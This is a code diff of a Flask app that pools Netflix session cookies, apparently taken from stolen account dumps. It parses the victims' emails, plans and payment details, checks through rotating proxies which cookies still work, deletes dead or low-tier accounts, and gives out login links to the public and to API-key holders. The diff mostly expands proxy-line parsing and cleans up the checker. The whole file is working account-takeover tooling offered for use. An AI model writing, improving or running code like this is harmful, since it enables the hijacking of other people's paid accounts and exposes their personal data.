@@ -1,12 +1,10 @@
 # nftbot_all.py — single-process Flask app for Railway
-import os, json, sys, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
+import os, json, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
 from contextlib import contextmanager
-from datetime import datetime, timezone
 from functools import wraps
 import requests
 from urllib3.exceptions import InsecureRequestWarning
-from flask import (Flask, request, redirect, session, render_template_string,
-                   url_for, jsonify, send_from_directory)
+from flask import (Flask, request, jsonify, send_from_directory)
 from flask_cors import CORS
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
@@ -25,12 +23,8 @@ os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 
 # ---------------- background checker state ----------------
 checker_state = {
-    "running": False,
-    "total": 0,
-    "checked": 0,
-    "kept": 0,
-    "deleted": 0,
-    "logs": []
+    "running": False, "total": 0, "checked": 0,
+    "kept": 0, "deleted": 0, "logs": []
 }
 
 # ---------------- netflix api ----------------
@@ -80,42 +74,25 @@ COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
 # ---------------- db ----------------
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS cookies (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    raw TEXT NOT NULL,
-    netflix_id TEXT NOT NULL UNIQUE,
-    profile_id TEXT,
-    meta_json TEXT,
-    fail_count INTEGER NOT NULL DEFAULT 0,
-    ok_count INTEGER NOT NULL DEFAULT 0,
-    last_error TEXT,
-    last_used REAL,
-    created_at REAL NOT NULL,
+    id INTEGER PRIMARY KEY AUTOINCREMENT, raw TEXT NOT NULL,
+    netflix_id TEXT NOT NULL UNIQUE, profile_id TEXT, meta_json TEXT,
+    fail_count INTEGER NOT NULL DEFAULT 0, ok_count INTEGER NOT NULL DEFAULT 0,
+    last_error TEXT, last_used REAL, created_at REAL NOT NULL,
     deleted INTEGER NOT NULL DEFAULT 0
 );
 CREATE INDEX IF NOT EXISTS idx_cookies_active ON cookies(deleted, fail_count);
 CREATE TABLE IF NOT EXISTS issued_tokens (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    cookie_id INTEGER NOT NULL,
-    api_key_id INTEGER,
-    token TEXT NOT NULL,
-    url TEXT NOT NULL,
-    expires INTEGER,
-    created_at REAL NOT NULL
+    id INTEGER PRIMARY KEY AUTOINCREMENT, cookie_id INTEGER NOT NULL,
+    api_key_id INTEGER, token TEXT NOT NULL, url TEXT NOT NULL,
+    expires INTEGER, created_at REAL NOT NULL
 );
 CREATE TABLE IF NOT EXISTS api_keys (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    key_hash TEXT NOT NULL UNIQUE,
-    key_prefix TEXT NOT NULL,
-    label TEXT,
-    calls INTEGER NOT NULL DEFAULT 0,
-    last_used REAL,
-    created_at REAL NOT NULL,
-    revoked INTEGER NOT NULL DEFAULT 0
+    id INTEGER PRIMARY KEY AUTOINCREMENT, key_hash TEXT NOT NULL UNIQUE,
+    key_prefix TEXT NOT NULL, label TEXT, calls INTEGER NOT NULL DEFAULT 0,
+    last_used REAL, created_at REAL NOT NULL, revoked INTEGER NOT NULL DEFAULT 0
 );
 CREATE TABLE IF NOT EXISTS nonces (
-    nonce TEXT PRIMARY KEY,
-    ip TEXT,
-    created_at REAL
+    nonce TEXT PRIMARY KEY, ip TEXT, created_at REAL
 );
 """
 _lock = threading.Lock()
@@ -168,14 +145,11 @@ def delete_api_key(kid):
 
 # ---------------- metadata ----------------
 FIELD_MAP = {
-    "email":          r"–\s*Email:\s*(.+)",
-    "verified":       r"–\s*Verified:\s*(.+)",
-    "profile":        r"–\s*Profile:\s*(.+)",
-    "plan":           r"–\s*Plan:\s*(.+)",
-    "next_billing":   r"–\s*Next billing:\s*(.*)",
-    "extra_members":  r"–\s*Extra members:\s*(.+)",
-    "country":        r"–\s*Country:\s*(.+)",
-    "payments":       r"–\s*Payments:\s*(.+)",
+    "email": r"–\s*Email:\s*(.+)", "verified": r"–\s*Verified:\s*(.+)",
+    "profile": r"–\s*Profile:\s*(.+)", "plan": r"–\s*Plan:\s*(.+)",
+    "next_billing": r"–\s*Next billing:\s*(.*)",
+    "extra_members": r"–\s*Extra members:\s*(.+)",
+    "country": r"–\s*Country:\s*(.+)", "payments": r"–\s*Payments:\s*(.+)",
     "source_cookies": r"–\s*Cookies:\s*(.+)",
 }
 
@@ -240,8 +214,7 @@ def fetch_token(netflix_id, proxy=None):
 def add_cookie(raw_text, source=None):
     ck = extract_cookie_dict(raw_text); nid = ck.get("NetflixId")
     if not nid: raise ValueError("no NetflixId in cookie")
-    pid = ck.get("profileId")
-    meta = parse_metadata(raw_text)
+    pid = ck.get("profileId"); meta = parse_metadata(raw_text)
     meta_json = json.dumps(meta) if meta else None
     now = time.time()
     with _lock, db() as c:
@@ -303,8 +276,7 @@ def _pick_random(plan=None, country=None):
         q += " AND json_extract(meta_json, '$.country') = ?"
         args.append(country.upper())
     q += " ORDER BY RANDOM() LIMIT 1"
-    with db() as c:
-        return c.execute(q, args).fetchone()
+    with db() as c: return c.execute(q, args).fetchone()
 
 def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
     attempts = 0; last_err = None; tried = set()
@@ -314,7 +286,7 @@ def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
         cid = row["id"]
         if cid in tried:
             if len(tried) >= pool_stats()["healthy"]:
-                raise RuntimeError(f"Pool exhausted after {attempts} attempts: {last_err}")
+                raise RuntimeError(f"Pool exhausted: {last_err}")
             continue
         tried.add(cid); attempts += 1
         try:
@@ -356,91 +328,121 @@ def hard_delete(cid):
     with _lock, db() as c: c.execute("DELETE FROM cookies WHERE id=?", (cid,))
 
 def bulk_delete_all():
-    with _lock, db() as c:
-        c.execute("DELETE FROM cookies")
+    with _lock, db() as c: c.execute("DELETE FROM cookies")
 
 # ---------------- Background Checker ----------------
 def parse_proxy_line(line):
     line = line.strip()
     if not line or line.startswith("#"): return None
     line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
-    match = re.match(r"^(?:(?P<scheme>https?|socks5h?|socks4a?)://)?(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>[^:\s]+):(?P<port>\d+)$", line)
-    if match:
-        d = match.groupdict()
-        scheme = d.get("scheme") or "http"
+    line = re.sub(r"\s+", " ", line).strip()
+
+    m = re.match(
+        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
+        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
+        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
+        line, re.IGNORECASE,
+    )
+    if m:
+        d = m.groupdict(); scheme = d["scheme"].lower()
         if d.get("user") and d.get("password"):
             return f"{scheme}://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
         return f"{scheme}://{d['host']}:{d['port']}"
+
+    m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
+    if m:
+        d = m.groupdict()
+        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
+
+    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
+    if m:
+        d = m.groupdict()
+        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
+
+    m = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
+    if m:
+        d = m.groupdict()
+        return f"http://{d['host']}:{d['port']}"
+
     parts = line.split(":")
-    if len(parts) == 4 and parts[3].isdigit():
-        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+    if len(parts) == 4:
+        a, b, c, d = parts
+        if b.isdigit() and not d.isdigit():
+            return f"http://{c}:{d}@{a}:{b}"
+        if d.isdigit() and not b.isdigit():
+            return f"http://{a}:{b}@{c}:{d}"
+
+    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)\s*[|,;\s]\s*(?P<user>[^:\s]+):(?P<password>\S+)$", line)
+    if m:
+        d = m.groupdict()
+        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
+
     return None
 
 def run_checker(proxies_input):
+    raw_lines = [l for l in (proxies_input or "").splitlines() if l.strip() and not l.strip().startswith("#")]
     proxies = []
-    for line in proxies_input.splitlines():
+    for line in raw_lines:
         p = parse_proxy_line(line)
         if p: proxies.append(p)
 
     global checker_state
     with _lock:
-        checker_state.update({"running": True, "total": 0, "checked": 0, "kept": 0, "deleted": 0, "logs": []})
+        checker_state.update({"running": True, "total": 0, "checked": 0,
+                              "kept": 0, "deleted": 0, "logs": []})
+
+    checker_state["logs"].append(f"[PROXY] {len(raw_lines)} lines received, {len(proxies)} parsed OK")
+    for i, p in enumerate(proxies[:3], 1):
+        masked = re.sub(r"://.*?@", "://***:***@", p)
+        checker_state["logs"].append(f"[PROXY] #{i}: {masked}")
+    if raw_lines and not proxies:
+        checker_state["logs"].append("[PROXY] None parsed. Format: ip:port or user:pass@ip:port or ip:port:user:pass")
 
     with db() as c:
         rows = c.execute("SELECT id,netflix_id,meta_json FROM cookies WHERE deleted=0").fetchall()
         total = len(rows)
 
     checker_state["total"] = total
-    checker_state["logs"].append(f"[START] Checking {total} cookies with {len(proxies)} proxies...")
+    checker_state["logs"].append(f"[START] Checking {total} cookies...")
 
     for idx, row in enumerate(rows, 1):
         if not checker_state["running"]: break
-        
-        cid = row["id"]
-        nid = row["netflix_id"]
+        cid = row["id"]; nid = row["netflix_id"]
         proxy = random.choice(proxies) if proxies else None
-        
+
         try:
-            # Check if the cookie is live
             fetch_token(nid, proxy=proxy)
-            
-            # If we got here, it's a live account. Check if it's Premium or Standard
             meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
-            plan = meta.get("plan", "").lower()
-            
-            if plan in ["premium", "standard", "standard_with_ads"]:
+            plan = (meta.get("plan") or "").lower()
+            if plan in ("premium", "standard", "standard_with_ads"):
                 checker_state["kept"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan.upper()})")
+                checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan})")
             else:
-                # If it's Basic or Mobile, we can decide to delete it. 
-                # For now, let's delete it since the prompt asked to keep Premium/Standard
                 checker_state["deleted"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (Not Premium/Standard)")
+                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (plan={plan or 'unknown'})")
                 with _lock, db() as c:
                     c.execute("DELETE FROM cookies WHERE id=?", (cid,))
-                    
         except Exception as e:
             err = str(e).lower()
-            if "proxy" in err or "timeout" in err or "connect" in err:
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} ERROR (Proxy/Network)")
+            if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
+                checker_state["logs"].append(f"[{idx}/{total}] #{cid} ERR ({err[:40]})")
             else:
                 checker_state["deleted"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (Dead/On Hold)")
+                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (dead)")
                 with _lock, db() as c:
                     c.execute("DELETE FROM cookies WHERE id=?", (cid,))
 
         checker_state["checked"] = idx
-        time.sleep(1.5) # Rate limit
+        time.sleep(1.5)
 
     checker_state["running"] = False
-    checker_state["logs"].append("[DONE] Check completed.")
+    checker_state["logs"].append("[DONE]")
 
 # ---------------- app ----------------
 app = Flask(__name__)
 CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key", "X-Admin-Pass"])
 app.secret_key = PANEL_SECRET
 app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024
-
 init_db()
 
 @app.route("/", methods=["GET"])
@@ -472,18 +474,17 @@ def public_generate():
     plan = data.get("plan", "").strip().lower()
     country = data.get("country", "").strip().upper()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    
+
     if not nonce:
         return jsonify({"ok": False, "error": "Missing security challenge."}), 403
-        
+
     cleanup_nonces()
-    
     with _lock, db() as c:
         row = c.execute("SELECT nonce FROM nonces WHERE nonce=? AND ip=?", (nonce, ip)).fetchone()
         if not row:
-            return jsonify({"ok": False, "error": "Invalid or expired challenge. Please refresh."}), 403
+            return jsonify({"ok": False, "error": "Invalid or expired challenge."}), 403
         c.execute("DELETE FROM nonces WHERE nonce=?", (nonce,))
-        
+
     try:
         r = generate_link(plan=plan, country=country)
         r["meta"]["credit"] = "STYFAIR dev styfair (@styfair)"
@@ -524,7 +525,7 @@ def admin_verify():
 
 @app.route("/api/admin/keys", methods=["GET", "POST"])
 def admin_keys():
-    if not verify_admin_pass(): return jsonify({"ok": False, "error": "Unauthorized"}), 401
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
     if request.method == "GET": return jsonify(list_api_keys())
     data = request.get_json(silent=True) or {}
     raw, meta = create_api_key(label=data.get("label", "new-key"))
@@ -571,7 +572,6 @@ def admin_start_checker():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
     if checker_state["running"]:
         return jsonify({"ok": False, "error": "Checker already running."}), 400
-    
     proxies = (request.get_json(silent=True) or {}).get("proxies", "")
     threading.Thread(target=run_checker, args=(proxies,), daemon=True).start()
     return jsonify({"ok": True})
